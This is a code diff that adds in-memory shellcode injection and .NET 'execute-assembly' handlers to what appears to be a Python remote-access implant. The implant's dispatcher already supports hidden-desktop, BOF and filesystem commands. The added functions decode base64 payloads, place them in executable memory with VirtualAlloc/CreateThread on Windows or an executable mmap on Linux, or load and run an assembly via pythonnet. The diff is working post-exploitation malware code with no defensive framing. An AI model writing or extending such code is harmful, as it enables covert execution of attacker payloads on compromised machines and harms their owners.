@@ -226,6 +226,75 @@ def _handle_bof(command: str) -> str:
         return f'BOF error: {e}'
 
 
+def _handle_shinject(command: str) -> str:
+    import base64, ctypes, threading
+    sc_b64 = command.split(':', 1)[1] if ':' in command else ''
+    try:
+        sc = base64.b64decode(sc_b64)
+    except Exception as e:
+        return f'Error: base64 decode failed: {e}'
+    if not sc:
+        return 'Error: empty shellcode'
+    try:
+        if sys.platform == 'win32':
+            k32 = ctypes.windll.kernel32
+            ptr = k32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
+            if not ptr:
+                return 'Error: VirtualAlloc failed'
+            ctypes.memmove(ptr, sc, len(sc))
+            ht = k32.CreateThread(0, 0, ptr, 0, 0, 0)
+            if not ht:
+                return 'Error: CreateThread failed'
+            return f'Shellcode injected: {len(sc)} bytes, thread handle={ht}'
+        else:
+            import mmap
+            mm = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
+            mm.write(sc)
+            cfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
+            t = threading.Thread(target=cfunc)
+            t.daemon = True
+            t.start()
+            return f'Shellcode injected: {len(sc)} bytes (Linux/mmap)'
+    except Exception as e:
+        return f'Shellcode injection error: {e}'
+
+
+def _handle_asm(command: str) -> str:
+    if sys.platform != 'win32':
+        return 'Error: execute-assembly is Windows-only'
+    parts = command.split(':', 2)
+    args_str = parts[1] if len(parts) > 1 else ''
+    asm_b64 = parts[2] if len(parts) > 2 else ''
+    try:
+        import base64
+        asm_data = base64.b64decode(asm_b64)
+    except Exception as e:
+        return f'Error: base64 decode failed: {e}'
+    if not asm_data:
+        return 'Error: empty assembly'
+    try:
+        import clr
+        import System
+        from System.Reflection import Assembly
+        asm_bytes = System.Array[System.Byte](asm_data)
+        assembly = Assembly.Load(asm_bytes)
+        entry = assembly.EntryPoint
+        if not entry:
+            return 'Error: assembly has no entry point'
+        argv = args_str.split() if args_str else []
+        params = entry.GetParameters()
+        if len(params) == 1:
+            args_array = System.Array[System.String](argv)
+            result = entry.Invoke(None, System.Array[System.Object]([args_array]))
+        else:
+            result = entry.Invoke(None, None)
+        return f'Assembly executed: {result}' if result else 'Assembly executed (no output)'
+    except ImportError:
+        return f'Error: execute-assembly requires pythonnet (clr module). Assembly received: {len(asm_data)} bytes'
+    except Exception as e:
+        return f'Assembly execution error: {e}'
+
+
 def execute_command(command: str) -> str:
     if str(command).startswith('__hd:'):
         return hidden_desktop(command)
@@ -235,6 +304,10 @@ def execute_command(command: str) -> str:
         return _handle_fs(command)
     if str(command).startswith('__bof:'):
         return _handle_bof(command)
+    if str(command).startswith('__shinject:'):
+        return _handle_shinject(command)
+    if str(command).startswith('__asm:'):
+        return _handle_asm(command)
     try:
         if command.startswith('cd '):
             directory = command[3:].strip()
